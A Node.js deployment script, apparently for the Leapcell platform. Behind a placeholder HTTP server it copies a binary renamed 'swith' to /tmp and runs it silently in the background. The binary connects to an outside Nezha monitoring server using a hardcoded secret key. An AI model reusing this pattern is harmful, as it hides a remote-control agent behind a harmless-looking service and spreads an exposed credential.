const http = require('http');
const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');

// 从环境变量加载敏感数据
const PORT = process.env.PORT || 8080;
const NEZHA_SERVER = process.env.NEZHA_SERVER || 'agent.oklala.nyc.mn:443';
const NEZHA_KEY = process.env.NEZHA_KEY || '6727pOscbDZw0BulF6';

// 定义路径
const appDir = '/app'; // Leapcell 应用目录
const tmpDir = '/tmp'; // 可写入的临时目录
const originalSwithPath = path.join(appDir, 'swith');
const swithPath = path.join(tmpDir, 'swith');

// 创建 HTTP 服务器
const server = http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('Server is running');
});

// 执行启动脚本逻辑
const startScript = () => {
  try {
    // 1. 检查原始文件是否存在
    console.log(`检查原始文件: ${originalSwithPath}`);
    if (!fs.existsSync(originalSwithPath)) {
      throw new Error(`原始文件不存在: ${originalSwithPath}`);
    }

    // 2. 复制文件到 /tmp 目录
    console.log(`复制文件到: ${swithPath}`);
    fs.copyFileSync(originalSwithPath, swithPath);
    console.log('文件复制完成');

    // 3. 赋予 swith 可执行权限
    console.log(`赋予执行权限: ${swithPath}`);
    execSync(`chmod +x "${swithPath}"`);
    console.log('权限设置完成');

    // 4. 验证文件可执行
    fs.accessSync(swithPath, fs.constants.X_OK);
    console.log('文件可执行验证通过');

    // 5. 在后台启动 swith
    console.log(`启动 swith，连接服务器: ${NEZHA_SERVER}`);
    execSync(`nohup "${swithPath}" -s "${NEZHA_SERVER}" -p "${NEZHA_KEY}" --tls > /dev/null 2>&1 &`);
    console.log('swith 已启动');

  } catch (error) {
    console.error('startScript 错误:', error.message, error.stack);
    process.exit(1); // 失败时退出
  }
};

// 启动 HTTP 服务器并运行脚本
server.listen(PORT, () => {
  console.log(`服务器运行在端口 ${PORT}`);
  console.log(`当前工作目录: ${process.cwd()}`);
  console.log(`应用目录: ${appDir}`);
  startScript(); // 服务器启动后运行脚本
});

// 处理进程终止以清理
process.on('SIGINT', () => {
  console.log('服务器正在关闭');
  server.close(() => {
    // 可选：清理临时文件
    try {
      if (fs.existsSync(swithPath)) {
        fs.unlinkSync(swithPath);
        console.log('临时文件已清理');
      }
    } catch (e) {
      console.warn('清理临时文件时出错:', e.message);
    }
    process.exit(0);
  });
});